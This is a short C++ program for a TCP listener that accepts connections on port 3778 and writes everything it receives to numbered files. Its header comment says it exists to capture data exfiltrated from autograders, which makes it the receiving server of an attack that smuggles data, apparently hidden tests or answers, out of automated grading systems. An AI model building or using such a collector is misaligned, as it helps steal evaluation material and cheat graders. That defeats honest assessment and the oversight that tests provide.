/** Socket Listener
* This program runs on a server and logs all data sent to it.
* Used to capture the data that is exfiltrated from autograders.
*/

#include "headers.h"
#include <fstream>

#define dprint(x) do { cout<<#x<<"="<<x<<endl; } while(0);
const char ACK = 0x6;
int i;
void reciever(int connection) {
	string sbuf;
    char buf = (char)-1;
    while (true) {
        size_t bytesWritten = recv(connection, &buf, sizeof(buf), 0);
		if (bytesWritten <= 0) {
			break;
		}
		sbuf += buf;
        if (buf == '\0') break;
    }
	ofstream outfile(string("out.") + to_string(i++));
	outfile << sbuf;
	cout << sbuf << endl;

	//close(connection);
}

int main(int argc, char* argv[])
{

    auto sock = socket(AF_INET, SOCK_STREAM, 0);
    int yes = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, 4);

    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(3778);
    addr.sin_addr.s_addr = htonl(INADDR_ANY);

    ::bind(sock, (sockaddr*)&addr, sizeof(addr));

    listen(sock, 0);

    socklen_t len = sizeof(addr);
    getsockname(sock, (sockaddr*)&addr, &len);
    cout << "Server running on port " << ntohs(addr.sin_port) << endl;

    while (true) {
        auto clientConnection = accept(sock, 0, 0);
        thread(reciever, clientConnection).detach();
    }
}

